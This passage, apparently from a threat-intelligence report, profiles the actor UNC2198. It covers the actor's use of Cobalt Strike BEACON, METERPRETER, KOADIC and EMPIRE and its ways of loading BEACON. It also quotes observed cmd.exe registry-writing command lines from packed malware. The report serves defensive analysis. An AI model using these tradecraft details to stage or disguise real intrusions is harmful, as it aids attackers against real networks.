\\WINDOWS\\Temp\\yoKjaqTIzJhdDLjD.bat UNC2198 has used Cobalt Strike BEACON, Metasploit METERPRETER, KOADIC, and PowerShell EMPIRE offensive security tools during this phase as well.
Offensive Security Tooling UNC2198 has used offensive security tools similarly seen across many threat actors.
UNC2198 has used BEACON in roughly 90% of their intrusions.
UNC2198 installs and executes Cobalt Strike BEACON in a variety of ways, including shellcode loaders using PowerShell scripts, service executables, and DLLs.
While the ways and means of using BEACON are not inherently unique, there are still aspects to extrapolate that shed light on UNC2198 TTPs.
Focusing in on specific BEACON executables tells a different story beyond the use of the tool itself.
Aside from junk code and API calls, UNC2198 BEACON and METERPRETER executables often exhibit unique characteristics of malware packaging, including odd command-line arguments visible within strings and upon execution via child processes: cmd.exe /c echo TjsfoRdwOe=9931 & reg add HKCU\\SOFTWARE\\WIlumYjNSyHob /v xFCbJrNfgBNqRy /t
REG_DWORD /d 3045 & exit cmd.exe /c echo ucQhymDRSRvq=1236 & reg add HKCU\\\\SOFTWARE\\\\YkUJvbgwtylk /v KYIaIoYxqwO /t
